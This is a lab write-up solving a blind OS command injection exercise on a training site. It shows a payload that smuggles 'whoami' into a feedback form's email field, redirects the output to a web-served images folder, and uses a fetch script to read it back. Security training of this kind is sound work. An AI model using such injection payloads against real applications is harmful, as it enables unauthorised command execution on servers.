# Blind OS command injection with output redirection

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

```
/var/www/images/
```

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output.

---

## 1. Detection

- Accessed the lab. It has the same feedback form structure as a previous lab, so went straight to `/feedback`.
- Filled in some test values and captured the request in DevTools:

```javascript
fetch("https://0ad600d803c7dfea80968fbc002400ec.web-security-academy.net/feedback/submit", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "https://0ad600d803c7dfea80968fbc002400ec.web-security-academy.net/feedback",
  "body": "csrf=VNXRe5IObKOWXLvqUaX27zA7B0RhRj0Z&name=Huzefa&email=huzefa%40gmail.com&subject=Huzefa&message=Huzefa",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

- From prior experience with this feedback form pattern, the `email` parameter was already known to be the injectable field, so testing jumped straight there instead of probing every field again.

---

## 2. Crafting the Output Redirection Payload

- Since this lab is blind and doesn't reflect command output in the response, the lab description points to a writable directory (`/var/www/images/`) that's also served back over HTTP via the image-loading endpoint — making it possible to redirect command output to a file there and read it back through a normal `GET` request.
- Injected the following payload into the `email` field:

```
huzefa%40gmail.com; whoami > /var/www/images/out.txt;
```

- This terminates the original command with `;`, runs `whoami`, and redirects its standard output into `out.txt` inside `/var/www/images/`, with a trailing `;` to keep the rest of the original shell command syntactically valid.
- To find the correct URL pattern for retrieving files from that directory, went to the home page, right-clicked one of the product images, and opened it in a new tab. Found the URL pattern:

```
https://0ad600d803c7dfea80968fbc002400ec.web-security-academy.net/image?filename=16.jpg
```

- This confirmed images (and therefore any file in that writable folder) are served via the `filename` query parameter on `/image`.

---

## 3. Solve the Challenge

- Combined both requests into a single script: submit the malicious feedback to write `out.txt`, then immediately fetch `out.txt` via the image endpoint to read the command's output.

```javascript
async function submitFeedbackAndLogImage() {
  try {
    // 1. Submit the POST request
    const response1 = await fetch("https://0ad600d803c7dfea80968fbc002400ec.web-security-academy.net/feedback/submit", {
      "headers": {
        "accept": "*/*",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
      },
      "referrer": "https://example.com/feedback",
      "body": "csrf=VNXRe5IObKOWXLvqUaX27zA7B0RhRj0Z&name=Huzefa&email=huzefa%40gmail.com; whoami > /var/www/images/out.txt;&subject=Huzefa&message=Huzefa",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });

    console.log(`First request status: ${response1.status}`);

    // 2. Fetch the subsequent text file
    const response2 = await fetch("https://0ad600d803c7dfea80968fbc002400ec.web-security-academy.net/image?filename=out.txt", {
      "method": "GET",
      "mode": "cors",
      "credentials": "include"
    });

    // 3. Extract and print the text content
    const textData = await response2.text();
    console.log("Response text from out.txt:");
    console.log(textData);

  } catch (error) {
    console.error("An error occurred during the fetch operations:", error);
  }
}

// Execute the function
submitFeedbackAndLogImage();
```

> **Why this works:** The `email` field's value is concatenated directly into a shell command on the backend without sanitization. The injected `;` terminates the original command, `whoami` runs and its output is redirected with `>` into a file inside `/var/www/images/` — a directory that's already served statically by the application's image endpoint. Since the command's output never reaches the HTTP response directly, redirecting it to a file inside a publicly accessible directory turns the blind injection into a readable one.

- The console printed the contents of `out.txt`, revealing the current user `peter-WHokno`.
- Lab solved.
